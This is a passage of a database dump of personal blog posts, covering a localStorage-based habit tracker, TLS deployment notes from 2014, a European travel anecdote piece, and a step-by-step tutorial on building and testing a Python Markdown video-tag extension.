The interesting part below is the use of `localStorage` to save the state of your progress. localStorage is a way to assign key:value store bound to the <a href="http://www.whatwg.org/specs/web-apps/current-work/multipage/origin-0.html">origin</a> with 5mb to play with.

```
:::javascript
(function () {
    "use strict";

    function compareDates(date1, date2) {
    console.log(date1 - date2);
        return (date1 - date2) / 86400000;
    }

    let jobs = document.getElementsByClassName("chainContainer");
    let todayDate = new Date();
    todayDate.setHours(0, 0, 0, 0);
    todayDate.setDate(todayDate.getDate());

    //  The chainContainer is setup to have an <h1> as the first element ([0]).
    //  This element''s text act''s as the local storage key.
    //  I.E. Changing the text will lose your history.
    //  You can have as many of them as you want (fit on a page). Just copy a different one and change the text etc.
    //  Chain links start at [1] and go for as many as you want. 1 per day though. Unless you want to change that.
    let jobHistories = [];
    for (let i = 0; i < jobs.length; i += 1) {
        jobHistories[i] = localStorage.getItem(jobs[i].children[0].textContent);

        for (let j = 1; j < jobs[i].children.length; j += 1) {
            jobs[i].children[j].classList.add("chainLink");
        }
    }


    //  Click on ''today''
    for (let i = 0; i < jobs.length; i += 1) {
        jobs[i].children[1].addEventListener("click", function () {
            // Serialise state to local storage
            let state = localStorage.getItem(this.parentNode.children[0].textContent);
            this.classList.add("done");

            if (state === null) {  //  Nothing in local history yet
                state = [];
            } else {
                state = state.split(",");
            }

            if (state.indexOf(todayDate.toDateString()) === -1) {
                state.push(todayDate.toDateString());
                localStorage.setItem(this.parentNode.children[0].textContent, state);
            }
        });
    }

    //  Restore from state
    for (let i = 0; i < jobs.length; i += 1) {
        let prevState;
        try {
            prevState = localStorage.getItem(jobs[i].children[0].textContent).split(",");
            for (let j = 0; j < prevState.length; j += 1) {
                let stateDate = new Date(prevState[j]);
                let dateDiff = compareDates(todayDate, stateDate);

                if (dateDiff > jobs[i].children.length - 2) {
                    break;  // Array out of bounds
                }

                jobs[i].children[dateDiff + 1].classList.add("done");
            }

            for (let j = 2; j < jobs[i].children.length; j += 1) {
                if (!jobs[i].children[j].classList.contains("done")) {
                    jobs[i].children[j].classList.add("notdone");
                }
            }
        } catch (TypeError) { //  No history yet
            for (let j = 2; j < jobs[i].children.length; j += 1) {
                jobs[i].children[j].classList.add("notdone");
            }
        }
    }

    //  Reset the history
    let reset = document.getElementById("reset");
    reset.addEventListener("click", function () {
        for (let i = 0; i < jobs.length; i += 1) {
            localStorage.clear(jobs[i].children[0].textContent);
            for (let j = 1; j < jobs[i].children.length; j += 1) {
                jobs[i].children[j].classList.remove("done");
                jobs[i].children[j].classList.remove("notdone");
            }
            for (let j = 2; j < jobs[i].children.length; j += 1) {
                jobs[i].children[j].classList.add("notdone");
            }
        }
    });
}());
```

First interesting thing here is the use of the `<H1>` as the key part of the key:value pair. This has one nice side effect: adding and removing goals and changing them is straightforward and cheap. Just edit the HTML to add a new `chainContainer` or change the H1 of an existing one. Changing an existing one will make a new key but will not delete the previous one. That means if you change it back, the history come back with it. These keys are still at the users control though, and a history wipe will take them with it.

The next thing to look at is the values themselves. The store is key:value strings. So pushing in objects will convert them to strings. There are a couple of implications of this: there are ONLY strings and not boolean or date objects, and you need to manually de-serialise objects.

Manual de-serialisation is quite straightforward: JavaScript will generally call the `.toString()` method on whatever you push. In this case it is an array which is comma delimited. The de-serialisation is to split it on that comma, and you have strings of what was in your array. Great. Next step (in this case) is to change the strings back to date objects by calling `new Date(string);`. One gotcha here is to make sure that today''s date ignores the hours and minutes component. Otherwise, you end up comparing fractions of days with whole days, and you get the wrong answer even though it looks right.

The lot of this [can be found on GitHub here][GitHub].

P.S. I am well aware of the inefficiencies of context switching.

[initialdesign]: https://assets.themetacity.com/image/blog/15minchaininitialdesign.jpg "Inital mockup of design and a checklist of how to go about building it."

[GitHub]: /github "Link to this project on GitHub"',NULL),
	('014529c1-f420-70a0-a729-aec190930d3b'::uuid,'Things to think about when implementing SSL/TLS on a public facing web server','things-to-think-about-when-implementing-ssl-tls-on-a-public-facing-website','Testing out support for TLS 1.2','blog'::com.variant,'Some things to think about when implementing site wide SSL/TLS. Remember that this was written in the early part of April 2014.

1. [Signing authorities vs self signed](#signingauthorities)
2. [Server support](#serversupport)
3. [Browser support](#browsersupport)

<h3 id="signingauthorities">Signing authorities vs self-signed</h3>
If you go self-signed than you can do whatever you want, and you will be happy. However, if you want to use a CA you are stuck with RSA. At the time of writing I couldn''t find a CA that offered to sign a ECDSA certificate (at least for small commercial prices) although I image that it will come eventually.

If you try to have the CA''s system sign the certificate you just get an error, some more helpful than others.

<h3 id="serversupport">Server support</h3>
Apache support for ECDHE suites only landed in 2.3. Arch Linux rolled onto 2.4 in March but that is not very fun in a production setup. Debian is still on 2.2 and will go to 2.4 in Jessie (the current testing branch) aka Debian 8.0. This means a typical Debian system will not support ECDHE suites and PFS until probably late this year or even later.

nginx supports ECDHE suites as of now.

Windows, I have no idea (or particularly care to).

CORS filters need to be updated to put an ''https'' at the front. Most tutorials et al. do not mention this as it is not assumed to be plain http.

<h3 id="browsersupport">Browser support</h3>
Firefox just got public release support for TLS 1.2 in the 27.0 release. Chromium in the 30.0 release. Internet Explorer has it on version 11. Safari version 7 on OS X 10.9.

The one that might really hit you however is the search bots do not yet support TLS 1.2. GoogleBot (Oct 1013) only supports SSL 3.0 and TLS 1.0. If you do not support either of them then Google can not index your site (inc webmaster tools). If that is important to you then you might what to think about that.

Additionally, mixed content policy now means that if a secured page tries to lead an ''unsecured'' page (i.e., https:// loading something with the uri to http://) then the http:// element won''t be loaded. this includes images, video, audio, scripts, fonts, anything. These can even be inside elements that are otherwise secured. For example, I use Google web fonts extensively in SVGs around this site. The default embedding code is <code>&lt;link href=''http://fonts.googleapis.com/css?family=FontYouWant'' rel=''stylesheet'' type=''text/css''&gt;</code> which is unsecured. So change all of them to https:// and, they load again. N.B. the link that that goes to has unsecured content linked in it which is OK and loads fine (not sure if that should happen or not).

',NULL),
    ('01535349-0a28-7053-bffe-c58e936d8717'::uuid,'This is a list of interesting people we met on our recent trip to Europe','this-is-a-list-of-interesting-people-we-met-on-our-recent-trip-to-europe','We met fun people on holiday. This is a list of some of them.','blog'::com.variant,'## Brown Dog Lady
We were in Verona, walking along the river on our way to see the Dom and the top of the mountain when we crossed paths with an elderly lady being followed by an old brown dog carrying its own lead. Being a sucker for something that cute, we struck up a conversation with Brown Dog Lady. She had a wonderful knowledge of the city, with its Roman origins and customs (riding down the centre of town through both gates, which had been moved once cars became common), and the effects of World War 2 that persist to this day (seen in the scar that both blights and illuminates the *Ponte Pietra*).

Brown Dog during this time, was torn between continuing to receive pats and also not losing the lead. Any pat would elicit a lean in that reinforced the pat as well as sitting on my foot, however any pat close to the neck or head would start a warning grown, presumable about ownership of the lead in his mouth. Super cute.

We moved once, slightly further up the river to see the repaired bridge and the Roman Amphitheater, meaning Brown Dog, who had laid down had to move. Being old he did not want to move. Liking pats, he wanted to move. Pats won out. As he finally made it to us, tragedy struck as he lay down again and, we parted ways. Here was the biggest decision he had to make: follow the newcomers and potentially get more pats or follow his human and get love and food. It took about a hundred meters and a bark or two before he decided to stick with his human. We think she was just super keen to practice her English language skills.

## Mental Illness Milk Lady
Io Gatto ordered a ''latte'' at the train station in Milan which immediately confused the attendant. After lots of hand waving and inventing a new sign-language she got what she ordered: a cup of hot milk with *no*  coffee. A milk coffee in Italy is a *caffè* latte. We abandoned the milk and moved outside to order lunch and coffee somewhere else to save face when someone with a clear mental-illness walks into the store. An attendant kicks her out however she immediately follows him back in and begs for the abandoned milk. The attendant sees us; we deny ownership of the milk, and so he relents to giving her said milk. On her way past us, now brandishing a cup of hot milk, a small song of ''latte, latte, latte…'' can be heard.

## Italian Army Dad
We sat in a beachside café in Vernazza after a three-kilometre walk from Monterosso. The whole area is some of the most beautiful seaside landscapes you will see. Signs indicate that it should be 90 minutes however I would argue that is for native mountain people and not fat and lazy tourists (German food will do that to a person).

Regardless, next to us was a family of three (Mum, Dad and Three Year Old) that were having a great time in the sun, clearly only there for the afternoon (talking to him later, they only lived a hundred or so kilometres away). They were playing with the napkins, eating great food and drinking great drinks.

He looked about as stereotypical as you can get: slicked back hair, wrap around sunglasses, olive tanned skin, the works. He was having a great time playing with his son, inventing games and fooling around. Every so often however he would glance at us and shy. Weird.

When he went to pay however, he offered to pay for our drinks as he felt that he was disturbing our romantic afternoon with his jiving. We tried to protest saying that we were not disturbed at all, but he was having none of it.

We started to talk and after learning we were from Australia he revealed that his sister-in-law was living in Sydney, and they had visited her and also travelled to Byron Bay, their dream home. I have no idea why you would leave the area around Cinco Terra (he lived an hour away in Pisa).

He then picked me for military (my bag gave it away), and he revealed that he had been in the Army and had also been deployed to Afghanistan under an Australian SF commander.

<aside>The actual path is about 3.5 km long and from sea level up to about 160m and back again a couple of times. This length is divided in to 25 sections, each marked with a sign. We did not know this until the end where there is a big notice board explaining all this. Anyway, we are about two thirds up the first and biggest hill about an hour into the walk, when Io Gatto asks someone coming from the other direction is we are near the end yet; we could be as we have not see an accurate, to scale map or know how many markers in the signs. Her (American) response: ''Oh honey, no… no…''</aside>

## Oranges guy
Once on top of the hills on the coast, the walk become much more manageable and quite relaxing, however the Sun and initial ascent take its toll. So when about a third of the way through the walk, a local orange farmer had run an extension lead from his farm above the path and was powering a juicer for the oranges he had picked from his trees that morning. There was no way to deny him.

He didn''t talk, however he did recognise joy and gratitude when observing the look on peoples faces when they imbibe his ambrosia. These oranges were really fantastic.

## French Guy
Quite often when we go on holiday, we end up running into the same people or groups and staying in step with them. This is not surprising: we stay in popular places and do popular things. Last time it happened was Tasmania with a family of five: Father, Mother, Eldest Child, and Identical Twins (fantastically the Twins had swapped one shoe each and wore their hair the same way).

This time it was the French Guy and his Wife. We first ran into them at dinner the first night we stayed in Montoroso. This guy exuded Frenchness: his size, his eating style, the clothes he wore, the lot! The stereotype was magnificent to behold.  Next time was breakfast the next day; no biggie, the restaurant is attached to the hotel. Then the town of Como, certainly a popular and obvious place, that afternoon, including a casual head nod to acknowledge the encounter.

Of course, we saw him the next day in Menzi. I believe in situations like this, the casual awkwardness needs to be called out, so upon seeing him and his Wife on the sightseeing train, I bellow a hearty ''bon journo'', much to his chagrin and the amusement of Wife.

*We* didn''t see them again.

## The Professor
At said restaurant in Montoroso there was also a man dubiously dubbed The Professor. His tawdry coat, rotund belly and pale complexion screamed professor. But professor of what? Io Gatto had an idea: his thesis was a comparison of the effectiveness of the Dewey decimal system and sorting by spine colour. Turns out his research showed that colour coding sorting was much more effective than the old tried and trusted Dewey Decimal System. Who knew?

He was English which makes this so much better.

## Berlin tour guy
English dude a season out of university was conducting the tour, who has discovered that a degree in philosophy does not an easily employed person make. So he is doing the Summer tour circuit for a season before heading back to the UK for another look at work. Very nicely summed up the culture, history, and zeitgeist of the city. I think philosophy has served him well.

## Coffee lady
I ordered a caffè latte, soya, decaf. The woman making the coffee was not impressed.

## Peppermint tea lady
My Aunt lives and works in London, England. I had not been for a decade so obviously we visited her and spent some time touring around the local suburb before hitting the tourist highlights. Next to my Aunt''s house, there is a kilometers long canal, complete with locks, and a really nice community that revolves around said canal; from people living in long boats that travel up and down the country to schools that use the canal as a social conduit, age-old derelict workshops strewn with vitrified bricks and timer contrasted with hyper modern housing complexes resplendent in their plastic and steel.

Despite Io Gatto protesting jetlag (and upon reflection, probably the flu) we set off down the canal. We discovered set into one of the many nooks and crannies of a faceless building directing our travel here lived a small tea and cake shop, no bigger than a small bus. On unknowably deliberate or not reclaimed seats and tables, we sat in the afternoon sun, watching a longboat sputter down the canal, off to explore parts unknown and while a heron searched for fish. I ordered a peppermint tea; the tattooed proprietor only had fresh. I was taken aback upon seeing her reach down and pull some peppermint leaves off the shrub next to her and put it into my cup. It took me a moment to realise I didn''t know what else I should have expected otherwise. I ate a pork pie at the restaurant several hundred meters down the canal just to round out the British experience.',NULL),
    ('015e0c1e-d9b0-7697-9f4f-4ddb04edf81f'::uuid,'Let''s make a terrible Markdown extension pt1 - Background','lets-make-a-terrible-markdown-extension-pt1-background','Part one of making a Python Markdown extension Where we talk about what we are going to try to build','blog'::com.variant,'[TOC]

##Downloads
You can play along at home by [looking at the full source here](https://assets.themetacity.com/code/theMetaCityMarkdown) and [download a gzipped version here](https://assets.themetacity.com/code/theMetaCityMarkdown.tar.gz).

##Background
Writing blog articles as vanilla HTML is no fun. To that end [Markdown](https://daringfireball.net/projects/markdown/) was created, which for the most part works well enough. Occasionally however there will be some markup that is not processed by the standard Markdown core and is bothersome to type by hand. Custom markup that would be handy to be processed automatically. Let''s make some.

There are many variants and parsers in most languages that will take your Markdown and process it into HTML. I am going to do this in Python which has a nice package called Markdown that can process said files.

~~~~{.python}
import Markdown
markdown.markdown(''#Example title to parse'')
~~~~

This produces the expected output:

~~~~{.html}
<h1>Example title to parse</h1>
~~~~

Riveting.

Thankfully Python Markdown also has a mechanism for extending and adding your own extensions to the standard markup, which we are going to do.

## The problem
Typing out `<video>` tags by hand to be used when replacing gif files is cumbersome and takes an annoyingly long time.

## The solution
Define a new tag that automatically expands to a known good configuration and is quick to type out.

The proposed solution would look like `<gifv baseFilename extension1,extension2,extension3 />`

## The result

~~~
<gifv gifv-demo-doggos webm />
~~~

becomes

~~~
<video autoplay="true" class="gifv" controls="false" loop="true">
    <source src="//assets.themetacity.com/gifv/gifv-demo-doggos.webm" />
</video
~~~

and puts a video in like this:

<gifv gifv-demo-doggos webm />

## Assumptions
This is block level tag. Doing this inline doesn''t fit with the idea of how I want to use the tag.

Piggybacking on Imgur''s marketing with the use of `gifv`.

## Let''s crack on
First stop is to [the docs](https://pythonhosted.org/Markdown/extensions/api.html). This is how we are going to define a new tag.

[Step 1.5 is to set up](lets-make-a-terrible-markdown-extension-pt1-5-build-and-deployment) a deployment/build method, which, while optional is pretty handy.

After that is to [dig in and get testing](lets-make-a-terrible-markdown-extension-pt2-getting-testing).','015e0c1e-d9b0-7697-9f4f-4ddb04edf81f'::uuid),
	('015e0c2d-b660-7263-9ef2-937ef68fb606'::uuid,'Let''s make a terrible Markdown extension pt1.5 - Build and deployment','lets-make-a-terrible-markdown-extension-pt1-5-build-and-deployment','First and a half part of making a Python Markdown extension where we set up the files, installation, so we can get to work.','blog'::com.variant,'[TOC]

Building and deploying extensions works well as a package. Here is how to do it reasonably for the extension we are writing.

##Assumptions
You are using a `virtulenv` that is specific to this project. Amongst all the the usual parts it brings `pip` which we will use to do the actual deploying. While `virtualenv` is not needed but it does keep this process much easier to keep straight. How and where you setup `virtualenv` is left as an exercise to the reader. Unless there is a compelling reason mine are usually stored in a dedicated directory `~/.virtualenvs` so as not to pollute the build or working directory.

Oh, and unix.

##setup.py
This is the config `pip` uses when building and deploying. Looks something like this:

```
:::python
#!/usr/bin/env python

from setuptools import setup

setup(
    name=''tmcmarkdown'',
    packages=[''tmcmarkdown'', ''tmcmarkdown.extensions'', ''tmcmarkdown.tests''],
    version=''1.0.2'',
    maintainer="Doug Miller",
    maintainer_email="dougmiller@themetacity.com",
    url="themetacity.com",
    py_modules=[
        ''gifv'',
    ],
    license=''LICENCE.md'',
    description=''A collection of markdown extensions used on theMetaCity.com'',
    long_description=open(''./README.txt'', ''r'').read(),
    install_requires=[''markdown'']
)
```

<aside>
This is actaully a really good example of why it is advisable to use the <code>!#/usr/bin/env</code> python construct. If you haven''t see that before, the idea is that rather than hardcoding the path to the executable you want to run the script, you defer to the OS to tell you what the path to the executable is.

This allows you to run the same script under different environments (i.e., a system installation and a virtualenv installation).

It is a handy way to remove one portability issue which costs nothing in implement.
</aside>

##Installation
The main driver here is obviously `setuptools`. This supersedes `distutils` and comes with `python` >= 3.4

If you have not already, [go read the docs](https://packaging.python.org).

Defining the package here allows up to do two things that are quite useful: install the package we are going to build into the current python environment site-packages and link the package into the current site-packages.

The first idea is useful for when the package is ready to be installed. The second is more interesting as it allows you to install the package via symlink into the site-package which removes the need to run the installation script everytime the package is changed (i.e. during development).

For the first: `python setup.py install` and the second `python setup.py develop`.

##Packages
Your version of this could look something like this one does:

~~~
|-- tmcmarkdown
|   |-- extensions
|   |   |-- gifv.py
|   |   `-- __init__.py
|   |-- tests
|   |   |-- __init__.py
|   |   `-- testgifv.py
|   `-- __init__.py
|-- LICENSE.md
|-- README.txt
`-- setup.py
~~~

This setup lets us `tmcmarkdown.extensions.gifv` and then use classes in there, ostensibly `GifV`.

The contents of `setup.py` requires

[On to testing.](lets-make-a-terrible-markdown-extension-pt2-getting-testing)','015e0c1e-d9b0-7697-9f4f-4ddb04edf81f'::uuid),
	('015e1154-25e8-7181-8243-f4755038d4dd'::uuid,'Let''s make a terrible Markdown extension pt2 - Getting testing','lets-make-a-terrible-markdown-extension-pt2-getting-testing','Second part of making a Python Markdown extension','blog'::com.variant,'[TOC]

##Lets test
Testing can be helpful. So let''s write some up.

##Assumptions
While we haven''t written any working code yet, we can set up working tests so that we can measure out progress as we fill out the class.

The package is on the path somewhere (by running `python setup.py develop).

##GifV.py

Open up `GifV.py` and put in enough to not have the tests return an error.

~~~{.python}
class GifV(Extension):
    pass
~~~

##TestGifV.py

The test file itself is straightforward: call markdown with the extension registered and double-check the output is as expected.

No setup or teardown needed.

Loading the extension is straightforward with `markdown.markdown(provided, extensions=[list of extensions])`.

~~~{.python}
import markdown
import unittest
from tmcmarkdown.extensions.gifv import GifV


class TestGifV(unittest.TestCase):
    def testNotEnoughOptions(self):
        provided = ''<gifv filename />''
        expected = ''<p><gifv filename /></p>''
        self.assertEqual(expected, markdown.markdown(provided, extensions=[GifV()]))

    def testBasicOptions(self):
        provided = ''<gifv sampleFileName extension />''
        expected = ''<video autoplay="true" class="gifv" controls="false" loop="true"><source src="//assets.themetacity.com/gifv/sampleFileName.extension" /></video>''
        self.assertEqual(expected, markdown.markdown(provided, extensions=[GifV()]))

    def testBasicOptionsNoSpaceAtEnd(self):
        provided = ''<gifv sampleFileName extension/>''
        expected = ''<video autoplay="true" class="gifv" controls="false" loop="true"><source src="//assets.themetacity.com/gifv/sampleFileName.extension" /></video>''
        self.assertEqual(expected, markdown.markdown(provided, extensions=[GifV()]))

    def testBasicOptionsWithStart(self):
        provided = ''START <gifv sampleFileName extension />''
        expected = ''<p>START <gifv sampleFileName extension /></p>''
        self.assertEqual(expected, markdown.markdown(provided, extensions=[GifV()]))

    def testBasicOptionsWithEnd(self):
        provided = ''<gifv sampleFileName extension /> END''
        expected = ''<p><gifv sampleFileName extension /> END</p>''
        self.assertEqual(expected, markdown.markdown(provided, extensions=[GifV()]))

    def testMultipleExtensions(self):
        provided = ''<gifv sampleFileName extension,otherextension,thirdextension />''
        expected = ''<video autoplay="true" class="gifv" controls="false" loop="true"><source src="//assets.themetacity.com/gifv/sampleFileName.extension" /><source src="//assets.themetacity.com/gifv/sampleFileName.otherextension" /><source src="//assets.themetacity.com/gifv/sampleFileName.thirdextension" /></video>''
        self.assertEqual(expected, markdown.markdown(provided, extensions=[GifV()]))

    def testTooManyOptions(self):
        provided = ''<gifv sampleFileName extension extraUnneeded />''
        expected = ''<p><gifv sampleFileName extension extraUnneeded /></p>''
        self.assertEqual(expected, markdown.markdown(provided, extensions=[GifV()]))

if __name__ == ''__main__'':
    unittest.main()
~~~

Unfortunately whitespace matters in the output here so the long strings have to remain.

Running the tests is straightforward, from the base of the module:

~~~
python -m unittest discover tmcmarkdown
~~~

will give you

~~~
.......
----------------------------------------------------------------------
Ran 7 tests in 0.021s

OK
~~~

Hooray.

Next up is [writing the bulk of the plugin](lets-make-a-terrible-markdown-extension-pt3-getting-coding).','015e0c1e-d9b0-7697-9f4f-4ddb04edf81f'::uuid),
	('015e20c7-41b8-7f97-8fbd-7136bf5d6524'::uuid,'Let''s make a terrible Markdown extension pt3 - Getting coding','lets-make-a-terrible-markdown-extension-pt3-getting-coding','Third part of making a Python Markdown extension where we write some atual code','blog'::com.variant,'[TOC]

Now that we are set up to build and test the code, lets get to coding.

~~~{.python hl_lines="1 9"}
class GifV(Extension):
    def __init__(self, *args, **kwargs):
        self.config = {
            ''video_url_base'': [''//assets.themetacity.com/gifv/'', ''URL of the directory the file resides in''],
            ''css_class'': [''gifv'', ''CSS class to append to the video to identify it as a gifv'']
        }
        super().__init__(*args, **kwargs)

    def extendMarkdown(self, md, md_globals):
        md.preprocessors.add(''gifv'', GifVPreprocessor(self), ''_begin'')
~~~

Your class definition needs to extend `Extension` which will hook it into the markdown system and then needs to define a method `extendMarkdown`.

The init sets up the config options you can define for the extension. These can be overwritten at the time the extension is processed like so:

~~~{.python}
import Markdown
markdown.markdown(''Demo text'', extensions=[GifV(css_class=''other_classname'')])
~~~

`extendMarkdown` is where the extension is registered in the markdown process. If your extension needs to do more than one thing, it is just a matter or registering both classes in here.

~~~
def extendMarkdown(self, md, md_globals):
    md.*.add(''gifv'', ClassWhereWorkHappens(self), ''_begin'')
    md.*.add(''gify'', DifferentClassWhereWorkHappens(self), ''_begin'')
~~~

`md.*.add()` registers the class with the `mardown` process. The `*` has a few different options depending on the type of extension needed. See further in the guide.

The `_being` string at the end there instructs the `markdown` package as to the order which to run the extension. The order matters as some transformations will affect how others work.

To see the order of the added processors it is a straightforward matter to query the `OrdereredDict` they are stored in, `md.preprocessors`. The usual rules for adding them in are the same as any other `OrdereredDict`.

Next up is to get on with the `GifPreprocessor` class.

[On to testing.](lets-make-a-terrible-markdown-extension-pt2-getting-testing)','015e0c1e-d9b0-7697-9f4f-4ddb04edf81f'::uuid),
	('015e20c7-4988-7a89-a8c5-70e407db72c2'::uuid,'Lets make a terrible Markdown extension pt4 - Getting coding pt2','lets-make-a-terrible-markdown-extension-pt4-getting-coding-pt2','Fifth and final part of making a Python Markdown extension','blog'::com.variant,'[TOC]

We now have all the parts in place to write the class that does the actual work of transforming text. As previously mentioned, there are several places throughout the markdown pipeline that we can insert our extension. [Lets read the docs](https://pythonhosted.org/Markdown/extensions/api.html) then have a brief look at each.

##Processors
The general flow here is to look at the source, attempt to parse it and build a tree out of it, making manipulations along the way, then serialising the tree out as HTML.

###Preprocessors
When `markdown` runs, the first process it runs makes the entire source available as a raw string. This will allow you to go through and correct any issues you find or work on the raw strings in some way. It is not smart in any way.

###Block parser
This looks at blocks of text separated by blank lines and attempts to build a `Tree` out of them. It is possible to manipulate this parsing.

###Treeprocessor
After block parsing, the process has built the source into an `ElementTree`. This will let you walk tree and modify it as you need.

###Inline patterns
The next process is to process inline strings i.e., the bold and underline and URL processing and other tags used within a string. It will not process HTMLesque tags.

###Post processor
At this point the `Tree` is serialised to a string and returned. If you need to you can run a `PostProcessor` to work with the output string.

##Example time!

Let''s build a preprocessor as we want to make a new tag that allows building of `<video>` tags based on the `<gif>` tag mentioned previously.

From `GifVPreprocessor()` line mentioned previously, lets build the class:

~~~{.python hl_lines="2"}
def extendMarkdown(self, md, md_globals):
    md.preprocessors.add(''gifv'', GifVPreprocessor(self), ''_begin'')
~~~

Preprocessors need to inherit from `markdown.preprocessors.Preprocessor` and define one method `run(lines)` with an argument of `lines` which is the entire source document.

~~~{.python hl_lines="6"}
class GifVPreprocessor(Preprocessor):
    def __init__(self, gifv, **kwargs):
        self.gifv = gifv
        super().__init__(**kwargs)

    def run(self, lines):
        pass
~~~

First step is to define a regex to match against when going through each line:

~~~{.python hl_lines="4"}
class GifVPreprocessor(Preprocessor):
    def __init__(self, gifv, **kwargs):
        self.gifv = gifv
        self.RE = re.compile(r''<gifv ([\w0-9_-]+) ([\w0-9_-]+[,?[\w0-9_-]+]?) ?/>$'')
        super().__init__(**kwargs)

    def run(self, lines):
        pass
~~~

This will match `<gifv word extension1,extension2,extensionX />` with an optional space at the end there.

The run method is passed the entire source document; it is up to us to deal with it how we want.

~~~{.python hl_lines="9 11"}
class GifVPreprocessor(Preprocessor):
    def __init__(self, gifv, **kwargs):
        self.gifv = gifv
        self.RE = re.compile(r''<gifv ([\w0-9_-]+) ([\w0-9_-]+[,?[\w0-9_-]+]?) ?/>$'')
        super().__init__(**kwargs)

    def run(self, lines):
        new_lines = []
        for line in lines:
            m = self.RE.match(line)
            if m:
                # you got a match, do what you ned to
            else:
                new_lines.append(line)  # pass through unmolested
        return new_lines  # sends back the completed source
~~~

Now it is a straightforward matter of breaking out the groups from the regex and building the `<video>` element.

~~~{.python}
class GifVPreprocessor(Preprocessor):
    def __init__(self, gifv, **kwargs):
        self.gifv = gifv
           super().__init__(**kwargs)

    def run(self, lines):
        new_lines = []
        for line in lines:
            m = self.RE.match(line)
            if m:
                filename = m.group(1)
                extensions = m.group(2).split('','')
                video = etree.Element(''video'')
                video.set("autoplay", "true")
                video.set("controls", "false")
                video.set("loop", "true")
                video.set("class", self.gifv.getConfig(''css_class''))

                for extension in extensions:
                    source = etree.SubElement(video, "source")
                    source.set(''src'', ''{}{}.{}''.format(self.gifv.getConfig(''video_url_base''), filename, extension))

                new_lines.append(etree.tostring(video, encoding="unicode"))
            else:
                new_lines.append(line)  # pass through unmolested
        return new_lines  # sends back the completed source
~~~

Why are we building this as an `ElementTree` and not raw strings? Well you can but raw strings are still a pain to deal with.

Why the `encoding="unicode"`? The etree will attempt to stringify but run into an error where strings are represented as bytes but are expecting strings because of the different ways Python 2 and 3 represent strings.

So you are done. Run the tests and see that it process the tag into what you need.

[You can see the full source here](https://assets.themetacity.com/code/theMetaCityMarkdown) and [download a gzipped version here](https://assets.themetacity.com/code/theMetaCityMarkdown.tar.gz).','015e0c1e-d9b0-7697-9f4f-4ddb04edf81f'::uuid),
	('01678cce-d2bd-77ba-bdfd-b8578a91c496'::uuid,'Writers write','writers-write','If you are going to do it, do it.','blog'::com.variant,'Writers write, photographers photograph, programmers program and runners run.

Just do. All the tools don''t matter if you don''t do the actual work of writing, running and programming. Excuses are grounded in reality (I do have a ten-week-old son) to look after but there is room to beat out your own brain telling you to do the lazy thing. To take the easy route.

That that is not what we are here to do.

Writers write, photographers photograph, programmers program and runners run.',NULL),
    ('0167b274-df18-7b29-99c6-e2f4df39902b'::uuid,'Time to rebuild the MetaCity','time-to-rebuild-the-metacity','the MetaCity backend is getting rebuilt. Here are some of the details.','workshop'::com.variant,'The MetaCity was originally started in early 2004 as part of a uni assignment. Initial used for learning and playing around to learn Java and database nonsense it evolved over the years to become a fairly basic blogging platform.

It is built using Java with JavaBeans and the JSTL on top of PostgreSQL and Tomcat reverse-proxied behind apache2.

Over the last fifteen years or so of building upon and maintaining the system, it has become increasingly harder to maintain the environment around developing, testing, deploying and serving. This is partly due to expanded scope of other projects taking up time and just getting sick of the time devoted to operations.

To that end, the plan is to rebuild the MetaCity in Python with Flask to bring it into line with the MetaCity Media. This unifies development to one language and one platform, reducing cognitive overhead.

An added benefit is that this will finally bring the MetaCity into the world of actual frameworks with all the benefits they bring. Notably, this includes an ORM for the first time, up to date language version, and an easier to access and manage third-party package management (pip).

I''m also going to rework how the workshop is build and managed so that it links in a bit nicer and makes showing it in other sections much easier too.

Processing articles remains the same but inserting and updating might (or might not, dunno yet) change as integrating would in theory be easier.

## Why?
### Play
This is the main reason. It is an opportunity to just see what I learn and experience with a different setup and development process. Python is interesting to work with, and I hope to have fun while also building something useful doing this.

### Server maintenance
Reverse proxing behind tomcat for one project has become too annoying. This adds another service that needs to be updated, configured and monitored. It also means that Java needs to be updated and maintained.

### The MetaCity is custom code all they way down
That was nice at the time, but the warts are showing. Here is what a rebuild hopes to solve:

#### No ORM
This one is simply a time saver. Currently, the ORM is a significant portion of the LOC and this boilerplate is a pain to maintain. While straightforward to do the mappings, it is the migrations and updates to the objects in templates that get dumb.

#### Template abstraction is messy
Files are manually included and messily combined to make the pages show correctly. The includes and override mechanic of Flask is much nicer to use.

#### Plugin/third party code is easier
The MetaCity''s plugins are all manually updated (via searching) and inserted into the appropriate directory manually. Flask uses pip and is much easier to maintain. Have not run into an issue with a feature being supported in Java and not in Python but the MetaCity is not doing anything too crazy.

## What would be changed/new?
Not too much really. This is basically a one for one feature wise rebuild. The main difference is (planned at least) to combine the tagging system to integrate the blog and workshop together, making indexes and notification of updates easier (as well as the document import). There are some schema changes to make this happen but for the most part there should be no data loss and only transparent changes to the front end.

## Other
This presents an interesting opportunity to do a comparison of speeds etc which might be interesting.

It will also be nice to time-lapse the whole thing to see what kind of dev time this takes.',NULL),
	('0167d7d9-7cf0-7800-ad20-00e455627cd9'::uuid,'InfoVis and the digital world','infovis-and-the-digital-world','Exploring Information Visualisation in the digital space','workshop'::com.variant,'What can we do with InfoVis these days?',NULL),
	('0168e3b3-d2e5-77d2-b054-c3383ea2078e'::uuid,'Not reading the fucking manual leads to pain. Again.','not-reading-the-fucking-manual-leads-to-pain-again','Did not read the manual and spent a few weeks writing code to handle file parsing that is totally unnecessary. Because I am an idiot. On the plus side, I get to delete code.','blog'::com.variant,'The articles for this site are written in Markdown and then parsed and inserted by Python.

I was manually parsing then constructing the articles from an in-house format that was a bit flaky. The format looked something like this:

```markdown
# Title of the article

The blurb/summary shown on the index pages.

###################
Type: blog/workshop
Tags: Comma,delimited,list
Parent: id of series parent
###################

Article proper starts
```

Problems arose immediately: does the first title line have a space or not? Is there always a blank line following that? Having to manually isolate the meta fields within the ```####################``` fenced blocks is dumb. Is there another blank line after that? Having to remember that this is the format and parse the file several times to make sure I have done it correctly.

Nonsense. Just nonsense.

Imagine my surprise then, that when I was reading the documentation of the extensions'' library that someone else had run into this issue, written it as an extension and published it as part of the main library. Who would have thought? Apparently not me.

Anyway, this transforms the code in two different ways: the files change to be in a much more palatable and stable format, and the files can now be read directly from disk and don''t require manually reading them in (also in the docs).

Goes from this:

```python
""" Setup etc done previously above """

class Article:
    def __init__(self, file_object):
        self.file_object = file_object
        self.markdown_processor = Markdown()

        self.meta = {}

        if file_object.id:
            self.meta[''id''] = int(file_object.id.strip(''-''))

        split_article = self.file_object.raw_data.split(''####################'')

        self.head = self._extract_head(split_article[0])
